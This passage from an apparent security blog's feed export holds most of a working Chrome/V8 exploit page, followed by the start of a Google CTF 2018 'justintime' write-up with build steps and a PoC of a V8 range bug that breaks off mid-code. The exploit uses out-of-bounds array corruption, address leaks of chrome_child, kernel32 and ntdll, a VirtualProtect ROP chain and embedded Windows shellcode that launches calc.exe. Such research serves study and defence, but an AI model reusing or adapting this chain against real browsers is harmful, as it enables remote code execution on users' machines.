class="built_in">arguments</span>.length;</span></span><br><span class="line"><span class="javascript">    a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line"><span class="undefined">    a1[0] = 1.1;</span></span><br><span class="line"><span class="javascript">    oob_double_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line"><span class="undefined">    oob_double_Array[0] = 1.1;</span></span><br><span class="line"><span class="javascript">    object_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line"><span class="undefined">    object_Array[0] = &#123;&#125;;</span></span><br><span class="line"><span class="undefined">    object_Array[1] = leak;</span></span><br><span class="line"><span class="undefined">    x = x &gt;&gt; 16</span></span><br><span class="line"><span class="javascript">    a1[x * <span class="number">19</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0xffff00000000</span></span></span><br><span class="line"><span class="javascript">    a1[x * <span class="number">21</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x2a00000000</span></span></span><br><span class="line"><span class="javascript">    a1[x * <span class="number">41</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x2a00000000</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a1, oob_double_Array, object_Array, oob_buffer;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span></span><br><span class="line"><span class="undefined">a3.length = 0x11000;</span></span><br><span class="line"><span class="undefined">a3.fill(3.3);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) fun(...a4);</span></span><br><span class="line"><span class="javascript"><span class="comment">// %OptimizeFunctionOnNextCall(fun);</span></span></span><br><span class="line"><span class="undefined">fun(...a3);</span></span><br><span class="line"><span class="javascript"><span class="comment">// console.log(a1.length);</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// console.log(oob_double_Array.length);</span></span></span><br><span class="line"><span class="undefined">/* for (var i = 0; i &lt; a1.length; i++)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a1[i]);</span></span><br><span class="line"><span class="undefined">&#125;  */</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"this is a2"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">user_space_read</span>(<span class="params">leak</span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">  object_Array[1] = leak;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> oob_double_Array[<span class="number">23</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">writePtr</span>(<span class="params">offset, address, value</span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">  oob_double_Array[offset] = address;</span></span><br><span class="line"><span class="javascript">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span></span><br><span class="line"><span class="undefined">  fake_dv[0] = value;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">readPtr</span>(<span class="params">offset, address</span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">  oob_double_Array[offset] = address;</span></span><br><span class="line"><span class="javascript">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> fake_dv[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function_addr = oob_double_Array[23];</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"[+] the get shell function addr is at "</span> + Int64.fromDouble(function_addr).toString());</span></span><br><span class="line"><span class="javascript">oob_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">%DebugPrint(get_shell);</span></span><br><span class="line"><span class="undefined">/* for (var i = 0; i &lt; oob_double_Array.length; i++)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(Int64.fromDouble(oob_double_Array[i]).toString());</span></span><br><span class="line"><span class="undefined">&#125; */</span></span><br><span class="line"><span class="undefined">%DebugPrint(a1);</span></span><br><span class="line"><span class="undefined">%DebugPrint(oob_double_Array);</span></span><br><span class="line"><span class="undefined">%DebugPrint(oob_buffer);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">oob_buffer_addr = user_space_read(oob_buffer);</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the oob_buffer_addr is at " + Int64.fromDouble(oob_buffer_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">oob_array_addr = user_space_read(oob_double_Array);</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the oob_array_addr is at " + Int64.fromDouble(oob_array_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">temp1 = Int64.fromDouble(oob_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble() - oob_array_addr + <span class="keyword">new</span> Int64(<span class="number">0x81</span>).asDouble());</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("temp1 is " + temp1.toString())</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">offset = lowerint(temp1) / 8;</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("offset is " + offset.toString())</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">/* object_Array[1] = oob_double_Array;</span></span><br><span class="line"><span class="undefined">oob_double_Array_addr = oob_double_Array[23];</span></span><br><span class="line"><span class="javascript">alert(<span class="string">"[+] the oob_double_Array_addr is at "</span> + Int64.fromDouble(oob_double_Array_addr).toString());</span></span><br><span class="line"><span class="undefined"> */</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(scratch);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_u64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(scratch);</span></span><br><span class="line"><span class="undefined">scratch_u8.fill(0x41, 0, 10);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> shellcode1 = [<span class="number">72</span>, <span class="number">131</span>, <span class="number">236</span>, <span class="number">40</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">228</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">139</span>, <span class="number">34</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">32</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">186</span>, <span class="number">142</span>, <span class="number">78</span>, <span class="number">14</span>, <span class="number">236</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">235</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">255</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">152</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">14</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">216</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">235</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">235</span>, <span class="number">42</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">202</span>, <span class="number">255</span>, <span class="number">211</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">197</span>, <span class="number">181</span>, <span class="number">73</span>, <span class="number">17</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">208</span>, <span class="number">232</span>, <span class="number">195</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">232</span>, <span class="number">209</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">232</span>, <span class="number">191</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">139</span>, <span class="number">233</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">221</span>, <span class="number">76</span>, <span class="number">3</span>, <span class="number">232</span>, <span class="number">69</span>, <span class="number">139</span>, <span class="number">181</span>, <span class="number">136</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">3</span>, <span class="number">243</span>, <span class="number">69</span>, <span class="number">139</span>, <span class="number">86</span>, <span class="number">24</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">32</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">103</span>, <span class="number">227</span>, <span class="number">60</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">202</span>, <span class="number">66</span>, <span class="number">139</span>, <span class="number">52</span>, <span class="number">147</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">192</span>, <span class="number">252</span>, <span class="number">172</span>, <span class="number">132</span>, <span class="number">192</span>, <span class="number">116</span>, <span class="number">7</span>, <span class="number">193</span>, <span class="number">207</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">248</span>, <span class="number">235</span>, <span class="number">244</span>, <span class="number">59</span>, <span class="number">250</span>, <span class="number">117</span>, <span class="number">220</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">36</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">102</span>, <span class="number">66</span>, <span class="number">139</span>, <span class="number">12</span>, <span class="number">83</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">28</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">139</span>, <span class="number">4</span>, <span class="number">139</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">195</span>, <span class="number">195</span>]</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(shellcode1.length);</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode1.length; i++)&#123;</span></span><br><span class="line"><span class="undefined">  shellcode[i] = shellcode1[i];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> div_addr = user_space_read(div);</span></span><br><span class="line"><span class="javascript">alert(<span class="string">"[+] the div_addr is at "</span> + Int64.fromDouble(div_addr).toString());</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">el_addr = readPtr(offset, div_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the el_addr is at " + Int64.fromDouble(el_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">el_vftable = readPtr(offset, el_addr);</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the leak is at " + Int64.fromDouble(leak).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">chrome_child_addr = el_vftable - (<span class="keyword">new</span> Int64(<span class="number">0x433e910</span>).asDouble());</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the chrome_child_addr is at " + Int64.fromDouble(chrome_child_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// kernel32_addr = readPtr(offset, chrome_child_addr + new Int64(0x49dbde8).asDouble()) - new Int64(0x20db0).asDouble();</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// x chrome_child!*CreateEventW*</span></span></span><br><span class="line"><span class="javascript">kernel32_addr = readPtr(offset, chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x49db4f8</span>).asDouble()) - <span class="keyword">new</span> Int64(<span class="number">0x21f20</span>).asDouble();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the kernel32_addr is at " + Int64.fromDouble(kernel32_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// ntdll_addr = readPtr(offset, kernel32_addr + new Int64(0x79208).asDouble()) - new Int64(0x9a9b0).asDouble();</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// 0:016&gt; x KERNEL32!*NtQueryEvent*</span></span></span><br><span class="line"><span class="javascript">ntdll_addr = readPtr(offset, kernel32_addr + <span class="keyword">new</span> Int64(<span class="number">0x76fe8</span>).asDouble()) - <span class="keyword">new</span> Int64(<span class="number">0xa55d0</span>).asDouble();;</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the ntdll_addr is at " + Int64.fromDouble(ntdll_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// gadget = ntdll_addr + new Int64(0xA0715).asDouble();</span></span></span><br><span class="line"><span class="javascript">gadget = ntdll_addr + <span class="keyword">new</span> Int64(<span class="number">0xAB9B5</span>).asDouble();</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the gadget(mov     rdx, [rcx+50h]\n mov     rbp, [rcx+18h]\n mov     rsp, [rcx+10h]\n) is at " + Int64.fromDouble(gadget).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">pop_rcx_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x40982c</span>).asDouble();</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the pop_rcx_ret is at " + Int64.fromDouble(pop_rcx_ret).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">pop_rdx_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x12d91a</span>).asDouble();</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the pop_rdx_ret is at " + Int64.fromDouble(pop_rdx_ret).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">pop_r8_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x11b6012</span>).asDouble();</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the pop_r8_ret is at " + Int64.fromDouble(pop_r8_ret).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">pop_r9_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x197b44c</span>).asDouble();</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the pop_r9_ret is at " + Int64.fromDouble(pop_r9_ret).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// virtaulprotect_addr = kernel32_addr + new Int64(0x193d0).asDouble();</span></span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript">virtaulprotect_addr = kernel32_addr + <span class="keyword">new</span> Int64(<span class="number">0x1B330</span>).asDouble();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the virtaulprotect_addr is at " + Int64.fromDouble(virtaulprotect_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">%DebugPrint(scratch);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">scratch_buffer_addr = user_space_read(scratch);</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the scratch_buffer_addr is at " + Int64.fromDouble(scratch_buffer_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_addr = readPtr(offset, scratch_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the scratch_addr is at " + Int64.fromDouble(scratch_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">sc_upper = upper(scratch_addr);</span></span><br><span class="line"><span class="undefined">sc_lower = lower(scratch_addr);</span></span><br><span class="line"><span class="undefined">scratch_addr1 = combineint(sc_upper, sc_lower);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sc_offset = <span class="number">0x20000</span> - scratch_addr1 % <span class="number">0x1000</span>;</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the sc_offset is at 0x" + sc_offset.toString(16));</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sc_addr = scratch_addr + <span class="keyword">new</span> Int64(<span class="string">"0x"</span> + sc_offset.toString(<span class="number">16</span>)).asDouble();</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the sc_addr is at " + Int64.fromDouble(sc_addr).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">scratch_u8.set(shellcode, <span class="built_in">Number</span>(sc_offset));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">scratch_u64.fill(gadget, 0, 100);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> fake_vtab = scratch_addr;</span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("[+] the fake_vtab is at " + Int64.fromDouble(fake_vtab).toString());</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> fake_stack = scratch_addr + <span class="keyword">new</span> Int64(<span class="number">0x10000</span>).asDouble();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> stack = [</span></span><br><span class="line"><span class="undefined">    pop_rcx_ret,</span></span><br><span class="line"><span class="undefined">    sc_addr,</span></span><br><span class="line"><span class="undefined">    pop_rdx_ret,</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Int64(<span class="number">0x1000</span>).asDouble(),</span></span><br><span class="line"><span class="undefined">    pop_r8_ret,</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Int64(<span class="number">0x40</span>).asDouble(),</span></span><br><span class="line"><span class="undefined">    pop_r9_ret,</span></span><br><span class="line"><span class="undefined">    scratch_addr,</span></span><br><span class="line"><span class="javascript">    virtaulprotect_addr, <span class="comment">// VirtualProtect</span></span></span><br><span class="line"><span class="undefined">    sc_addr,</span></span><br><span class="line"><span class="undefined">];</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; stack.length; ++i) &#123;</span></span><br><span class="line"><span class="undefined">    scratch_u64[0x10000/8 + i] = stack[i];</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x10</span>).asDouble(), fake_stack); <span class="comment">// RSP</span></span></span><br><span class="line"><span class="javascript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x50</span>).asDouble(), pop_rcx_ret + <span class="keyword">new</span> Int64(<span class="number">0x1</span>).asDouble()); <span class="comment">// RIP = ret</span></span></span><br><span class="line"><span class="javascript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x58</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x60</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">writePtr(offset, el_addr + <span class="keyword">new</span> Int64(<span class="number">0x68</span>).asDouble(), <span class="number">0</span>);</span></span><br><span class="line"><span class="undefined">writePtr(offset, el_addr, fake_vtab);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// alert("ok");</span></span></span><br><span class="line"><span class="javascript">div.dispatchEvent(<span class="keyword">new</span> Event(<span class="string">'click'</span>));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/det
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Google CTF justintime exploit</title>
    <link href="http://eternalsakura13.com/2018/11/19/justintime/"/>
    <id>http://eternalsakura13.com/2018/11/19/justintime/</id>
    <published>2018-11-19T03:53:18.816Z</published>
    <updated>2018-11-19T11:40:57.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/" target="_blank" rel="noopener">https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time/</a><br>Thanks for Stephen, I learned a lot from his amazing challenge.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>I am lazy, so I use Xcode to compile V8 version 7.2.0 (candidate)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/v8/v8</span><br><span class="line">git reset 7.2.0 --hard</span><br><span class="line">gclient sync</span><br><span class="line">gn gen out/gn --ide=<span class="string">"xcode"</span></span><br><span class="line">patch -p1 &lt; ./addition-reducer.patch</span><br><span class="line"><span class="built_in">cd</span> out/gn</span><br><span class="line">open all.xcworkspace/</span><br><span class="line">Compile</span><br></pre></td></tr></table></figure><h2 id="Some-features"><a href="#Some-features" class="headerlink" title="Some features"></a>Some features</h2><h3 id="Max-Safe-Integer-Range-of-Doubles"><a href="#Max-Safe-Integer-Range-of-Doubles" class="headerlink" title="Max Safe Integer Range of Doubles"></a>Max Safe Integer Range of Doubles</h3><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.MAX_SAFE_INTEGER = <span class="number">2</span>^<span class="number">53</span> - <span class="number">1</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line">x += <span class="number">1</span>;<span class="comment">//x = 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> y = <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>;<span class="comment">//y = 9007199254740992</span></span><br><span class="line">y += <span class="number">2</span>;<span class="comment">//y = 9007199254740994</span></span><br></pre></td></tr></table></figure></p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">doit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> x = doit ? <span class="number">9007199254740992</span> : <span class="number">9007199254740991</span><span class="number">-2</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #30:SpeculativeNumberAdd[Number](#25:Phi, #29:NumberConstant, #26:Checkpoint, #23:Merge)  [Type: Range(9007199254740990, 9007199254740992)]</span></span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// #29:NumberConstant[1]()  [Type: Range(1, 1)]</span></span><br><span class="line">    <span class="comment">// #31:SpeculativeNumberAdd[Number](#30:SpeculativeNumberAdd, #29:NumberConstant, #30:SpeculativeNumberAdd, #23:Merge)  [Type: Range(9007199254740991, 9007199254740992)]</span></span><br><span class="line">    x -= <span class="number">9007199254740991</span>;<span class="comment">//解释:range(0,1);编译:(0,3);</span></span><br><span class="line">    <span class="comment">// #32:NumberConstant[9.0072e+15]()  [Type: Range(9007199254740991, 9007199254740991)]</span></span><br><span class="line">    <span class="comment">// #33:SpeculativeNumberSubtract[Number](#31:SpeculativeNumberAdd, #32:NumberConstant, #31:SpeculativeNumberAdd, #23:Merge)  [Type: Range(0, 1)]</span></span><br><span class="line">    x *= <span class="number">3</span>;<span class="comment">//解释:(0,3);编译:(0,9);</span></span><br><span class="line">    <span class="comment">// #34:NumberConstant[3]()  [Type: Range(3, 3)]</span></span><br><span class="line">    <span 